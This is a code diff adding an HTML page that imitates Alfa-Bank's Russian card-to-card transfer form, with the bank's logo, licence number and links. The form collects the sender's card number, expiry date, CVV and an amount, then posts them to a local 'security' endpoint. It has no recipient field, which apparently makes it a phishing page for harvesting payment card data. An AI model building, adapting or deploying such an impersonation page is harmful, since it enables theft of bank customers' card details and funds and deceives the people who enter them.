@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <title>Alfa Portal</title>
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+    <meta name="viewport" content="user-scalable=yes, maximum-scale=2, minimum-scale=0.5, width=device-width"/>
+
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="styles/styles.css">
+    <link rel="stylesheet" href="fonts/font-awesome/css/font-awesome.min.css">
+</head>
+<body ontouchstart>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="jquery.payment.js"></script>
+
+<script>
+
+$(function(){
+    $("input[id=card-num]")[0].oninvalid = function () {
+        this.setCustomValidity("Неправильный номер карты");
+    };
+});
+$(function(){
+    $("input[id=card-month]")[0].oninvalid = function () {
+        this.setCustomValidity("Неправильный срок действия карты");
+    };
+});
+$(function(){
+    $("input[id=card-year]")[0].oninvalid = function () {
+        this.setCustomValidity("Неправильный срок действия карты");
+    };
+});
+$(function(){
+    $("input[name=card_cvv]")[0].oninvalid = function () {
+        this.setCustomValidity("Неправильный CVV");
+    };
+});
+$(function(){
+    $("input[id=card-num]")[0].oninput= function () {
+        this.setCustomValidity("");
+    };
+});
+$(function(){
+    $("input[id=card-month]")[0].oninput= function () {
+        this.setCustomValidity("");
+    };
+});
+$(function(){
+    $("input[id=card-year]")[0].oninput= function () {
+        this.setCustomValidity("");
+    };
+});
+$(function(){
+    $("input[name=card_cvv]")[0].oninput= function () {
+        this.setCustomValidity("");
+    };
+});
+
+</script>
+<div class="container">
+    <a href="https://alfabank.ru"><img class="bank-logo" src="images/bank-logo.png"></a>
+    <h1 class="title">Переводы с карты на карту</h1>
+    <form id="form" data-role="form" action="security" method="post">
+
+
+        <div class="card-container">
+            <div class="f-left">
+                <div class="c-container control card m-left" data-role="card">
+                    <div class="card-bank-logo"></div>
+                    <div class="payment-system-container">
+                        <div>
+                            <span class="payment-system MIR" data-role="cardLogo mir"></span>
+                            <span class="payment-system Maestro" data-role="cardLogo maestro"></span>
+                            <span class="payment-system MasterCard" data-role="cardLogo mastercard"></span>
+                            <span class="payment-system Visa" data-role="cardLogo visa"></span>
+                            <div class="clear"></div>
+                        </div>
+                    </div>
+                    <div class="input-container">
+                        <div class="card-number-input">
+
+                            <input class="card-number " id="card-num" placeholder="Номер карты" data-tooltip="0000 0000 0000 0000" pattern="[2-6]{1}[0-9]{15,18}"
+                                   data-role="numberFullSender senderNumber" maxlength="19" name="number" data-mask="">
+                        </div>
+                        <div class="date-input">
+                            <span class="date-info info">ММ/ГГ</span>
+                            <!--<input data-role="senderDate" type="date" data-date-format="MM/YY" data-tooltip="00/00" novalidate="" type="tel" class="date " placeholder="ММ/ГГ">&ndash;&gt;
+                            --><input class="b-input b-input_card_date b-input_card_month" required id="card-month" maxlength="2" pattern="(0[0-9]|1[012]){1,2}" name="date_month" type="text"
+                                      data-check="cardMonth"> /
+                            <input class="b-input b-input_card_date b-input_card_year" required id="card-year" pattern="(^[1][9]{1})|(^[2][0-9]{1})" type="text" maxlength="2" name="date_year"
+                                   data-check="cardYear">
+
+                        </div>
+
+                        <div class="cvc-input" data-role="codeScope">
+                            <span class="cvc-info info hide">CVC</span>
+                            <input type="password" maxlength="3" data-role="code" data-tooltip="000" novalidate="" name="card_cvv" value="" autocomplete="off" class="cvc" placeholder="CVC"
+                                   required pattern="[0-9]{3,4}">
+                        </div>
+                    </div>
+                    <div class="focus-box-shadow hide"></div>
+                </div>
+
+            </div>
+
+
+        </div>
+        <div class="clear"></div>
+        <div class="title error-message">
+            <div class="error" data-error="senderDate">Неправильный срок действия карты отправителя</div>
+            <div class="error" data-error="senderNumber">Неправильный номер карты отправителя</div>
+            <div class="error" data-error="recipientNumber">Неправильный номер карты получателя</div>
+            <div class="error" data-error="code">CVC2 / CVV2 обязателен для данной карты отправителя</div>
+            <div class="error" data-error="sum">Сумма должна быть больше 0</div>
+
+        </div>
+        <h2 class="title">Сумма перевода</h2>
+        <div class="amount-input">
+            <input type="text" class="hide" data-role="sum" data-mask="price maxlength:9" value="" name="tfr_amount" novalidate="" autocomplete="off">
+            <input type="text" class="amount " data-role="sumMask" placeholder="0" value="" novalidate="" autocomplete="off">
+        </div>
+
+        <button type="submit" class="send-button button" data-role="submit" name="action_proceed">
+            Отправить
+        </button>
+    </form>
+    <div class="agreement">Нажимая «Отправить» соглашаюсь<br>на <a target="_blank" href="https://alfabank.ru/f/3/everyday/cardtocard/oferta_p2p.pdf" class="agreement">условия переводов</a></div>
+    <div class="additional-info">
+        <p>С лимитами на осуществление переводов с карты на карту можно ознакомится на <a href="https://alfabank.ru/everyday/cardtocard/" class="agreement">сайте АО «Альфа-Банк»</a>.
+            Переводы по России - в рублях РФ, международные - в рублях или долларах США или Евро.</p>
+        <p>Банки-эмитенты карт могут устанавливать дополнительные условия и ограничения для проведения переводов с карты на карту. Переводы с кредитных карт Альфа-Банка разрешены.</p>
+        <p>Зачисление на карты Альфа-Банка (Россия, Украина (Visa), Беларусь, Казахстан) - моментально, на карты других банков - зависит от банка получателя: от нескольких минут до нескольких
+            дней.</p>
+
+    </div>
+    <img src="./initial_files/payment-systems.png" class="payment-systems">
+    <div class="license">АО «Альфа-Банк» Генеральная лицензия ЦБ РФ №1326</div>
+</div>
+
+
+</body>
+</html>
